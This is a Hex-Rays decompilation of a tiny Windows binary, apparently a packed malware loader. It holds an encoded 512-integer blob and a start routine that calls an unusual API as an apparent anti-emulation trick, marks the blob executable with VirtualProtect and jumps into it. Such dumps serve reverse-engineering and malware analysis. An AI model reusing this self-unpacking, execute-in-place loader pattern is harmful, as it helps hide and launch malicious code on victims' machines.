/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

void start();

//-------------------------------------------------------------------------
// Data declarations

int dword_401000[512] =
{
  -90250792,
  26615,
  501743616,
  1,
  436207616,
  33554425,
  -922746872,
  1514045756,
  1423296047,
  -282682139,
  -715771010,
  794848119,
  137726656,
  923520119,
  -2029390664,
  2102767046,
  651135795,
  766539446,
  127058430,
  89352113,
  -1216143347,
  -187990571,
  1928094159,
  608471216,
  1036574948,
  -2026569736,
  1673822932,
  344646752,
  16,
  -2029268617,
  227216430,
  -2031682443,
  211365966,
  -503316480,
  124168597,
  1577186240,
  899274,
  -192086016,
  1667075291,
  -297714796,
  -214287366,
  -1507851266,
  -58625570,
  -295376165,
  -2134444718,
  -328897723,
  -1168821745,
  703528065,
  -177476516,
  1868398477,
  -2035354368,
  1468733502,
  -2028224513,
  1057159232,
  -1929646219,
  -23497659,
  -1392508928,
  1571504895,
  2018872006,
  2061467270,
  -22232637,
  -805312065,
  2061446616,
  138754243,
  1571909453,
  182179071,
  1606484363,
  1950679806,
  1057161079,
  472105849,
  63064417,
  1804260608,
  1745351875,
  2061467394,
  604276409,
  69452667,
  1804260543,
  -539475073,
  621266039,
  2061463552,
  -854032038,
  -939330522,
  -997625641,
  26616,
  729874432,
  -1069401316,
  2123029248,
  4177860,
  -1056931073,
  -997654464,
  -398464568,
  12288,
  -438831933,
  222947328,
  -1712846670,
  -1998618941,
  -57967555,
  1637059780,
  -2030059458,
  -1069515913,
  -2036043008,
  -980744147,
  290228996,
  2123763504,
  4178172,
  -1445824137,
  -1366469001,
  4178173,
  506161,
  -1580007424,
  -2032011991,
  -1069479041,
  -200853248,
  -2032694616,
  -1224508347,
  4177860,
  -1056929161,
  -1546452928,
  -1057979785,
  -57999296,
  2018347716,
  822241473,
  1994567419,
  -19151753,
  -1069516929,
  71665920,
  601835873,
  893098524,
  -858852534,
  -756349187,
  -655544278,
  -1025048326,
  869276669,
  864145104,
  -716050178,
  864188234,
  -611413088,
  864154442,
  -730957793,
  -519457987,
  936343618,
  970439477,
  -1054046011,
  1997093751,
  1683339557,
  -2101350084,
  -1016421822,
  -1298020785,
  2069667250,
  1482719231,
  -267672959,
  2095247150,
  -528352628,
  1879154373,
  -1159327122,
  864142175,
  934312010,
  -1165090619,
  1323269724,
  -1936588603,
  864154439,
  -836215312,
  836154181,
  958104684,
  -1199443126,
  -921725953,
  -190947727,
  -375524100,
  327545089,
  -1253011292,
  -789998601,
  1859591420,
  -781644341,
  -1064321050,
  1457484216,
  -672262360,
  -922597889,
  -1764298115,
  -1166397243,
  130150290,
  853160645,
  668106125,
  -1923740217,
  864154445,
  -1690243161,
  -1056339860,
  1197295730,
  -1732211847,
  870887501,
  1185717018,
  -258241671,
  1701643842,
  1203171180,
  1954563145,
  -259985302,
  847411070,
  264665485,
  1917522518,
  -1162415282,
  1003981670,
  1197263970,
  805681529,
  264664110,
  -1162366898,
  -1056370074,
  1004501062,
  50479222,
  839997077,
  864165218,
  55836746,
  870750851,
  668005194,
  -345328835,
  -1031670966,
  -192921555,
  -144055622,
  562164554,
  -1051394166,
  1617516857,
  864173410,
  -1052190646,
  868260698,
  476640074,
  -1066753626,
  1531633671,
  1959420502,
  1546517098,
  864154406,
  870249271,
  -1282932662,
  768669046,
  -1092777267,
  -1597820340,
  890353093,
  458586144,
  -433684614,
  1635810405,
  503838207,
  1932517648,
  1539553853,
  1197312872,
  1332394589,
  -1034056839,
  -945180804,
  -938812626,
  2095247150,
  -528352628,
  1879154373,
  -251063682,
  1132582466,
  -1260090503,
  -1078444494,
  1164524365,
  1535784387,
  864154442,
  379969227,
  -360565961,
  864447667,
  -284626870,
  -1132317899,
  -202863865,
  865202914,
  870851146,
  1972320482,
  1180080963,
  -250901639,
  68255094,
  -1165872331,
  -116814089,
  456978290,
  -1188659304,
  -207682355,
  -1184723894,
  -207766339,
  -284062646,
  -578669771,
  1197449058,
  -83835015,
  914502453,
  864017615,
  -149844918,
  -645778635,
  -1080878326,
  -1888875594,
  -1117942920,
  1938392847,
  829650761,
  1275654986,
  -1888869344,
  190679928,
  -208061491,
  1208417354,
  -478022837,
  1225562913,
  -1298560135,
  868337693,
  896235081,
  -116853942,
  130740094,
  -642387228,
  -472675318,
  -611711623,
  595860521,
  1197222242,
  -922146183,
  1071085634,
  -176046907,
  -540313546,
  -385264003,
  129560642,
  768164937,
  533808201,
  729548487,
  -922148320,
  937160770,
  -1165345595,
  852085517,
  322077570,
  845918594,
  -1689144515,
  -1166918459,
  -1106706696,
  1071050846,
  1116343885,
  -1296291410,
  2019547792,
  -598342279,
  -756486953,
  1197442402,
  -1341556871,
  1384248138,
  -1275496464,
  847377226,
  -1022821609,
  -1068238778,
  1003941920,
  -791536864,
  2003452368,
  995986295,
  -578222710,
  1964998114,
  1229101881,
  1678347129,
  -1166932027,
  -1051461571,
  861239372,
  -931071233,
  1938382402,
  -1987252482,
  818932602,
  -209045939,
  -508419830,
  -948073502,
  1223858819,
  -1699181703,
  1929489253,
  -1155426210,
  -385287393,
  129560642,
  -1080680411,
  -1987242726,
  -1048451859,
  -1877381118,
  864154442,
  -1056388098,
  -1810829246,
  -1165888694,
  1004466232,
  -1299825467,
  1563621987,
  -1724984467,
  -1662755344,
  1003864906,
  864914479,
  192279114,
  -251028372,
  -1811877822,
  847377226,
  864179917,
  -1034827702,
  1879668612,
  1384248138,
  1947301912,
  847377226,
  -167183617,
  -1299457970,
  -642582901,
  -1080878326,
  862587830,
  -1151497353,
  900265736,
  -1121088827,
  404821810,
  -1165888694,
  843381536,
  864154442,
  -2096577339,
  864154250,
  -1165359539,
  1032388352,
  992929278,
  846333578,
  -639501553,
  1182996810,
  1683815167,
  -798386197,
  864141995,
  935491658,
  -1165086011,
  -519509246,
  733071938,
  873001982,
  -1065731277,
  465139582,
  -1131794867,
  -196808942,
  864154154,
  801077834,
  1938930155,
  -645794164,
  -1622271158,
  -949365158,
  -111309962,
  200419634,
  796923213,
  -1252195773,
  888385714,
  1836560650,
  897448338,
  878332249,
  357497278,
  1942876594,
  -588634300,
  -1014246659,
  -823845892,
  -754639381,
  -159572719,
  -790588418,
  -422069335,
  -276555310,
  850464009,
  -790225945,
  973798952,
  331759406,
  637622091,
  -110119442,
  1469839108,
  -1905051078,
  -581287292,
  -947834942,
  98840525,
  -1545154085,
  -592399905,
  63314669,
  -479039772,
  885909263,
  1490154912,
  534853783,
  880833130,
  1821022021,
  -69081243,
  316949342,
  -561323195,
  935494970,
  -1385012916,
  1670020926,
  304479772,
  401597273,
  918616885,
  438482634,
  -776896700,
  -1795872310,
  882070227,
  -142391924,
  657440389,
  -791290646,
  695440370,
  334704473,
  -1079396953,
  361532588,
  -321515026,
  -1925156013,
  1022816374,
  -182068434,
  -1045646667,
  534886909,
  550549340,
  -928786924,
  -796672734,
  -486007834,
  2034102622,
  918481250,
  -574633182,
  773020747,
  1032485672,
  306176551,
  892745068,
  -1532084917,
  -1012919998,
  -1123545330,
  270917842,
  -1524745542,
  -272510840,
  1007390330,
  1014630867,
  261611812,
  -1397081340,
  570804786,
  -416950564,
  490197373,
  -1527898301,
  458876742
}; // weak
char byte_401C3B[] = { '­' }; // weak
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern DWORD (__stdcall *GetTickCount)();
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern HRESULT (__stdcall *StgSetTimes)(const WCHAR *lpszName, const FILETIME *pctime, const FILETIME *patime, const FILETIME *pmtime);


//----- (00401B1B) --------------------------------------------------------
void start()
{
  char *v0; // edi
  DWORD v1; // [esp-4h] [ebp-10h] BYREF

  GetCommandLineA();
  GetTickCount();
  GetCurrentProcessId();
  v0 = &byte_401C3B[StgSetTimes(0, 0, 0, 0) + 2147286788];
  v1 = 0;
  VirtualProtect(dword_401000, 0xB1Bu, 0x40u, &v1);
  __asm { jmp     edi }
}
// 401C26: unbalanced stack, ignored a potential tail call
// 401000: using guessed type int dword_401000[512];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
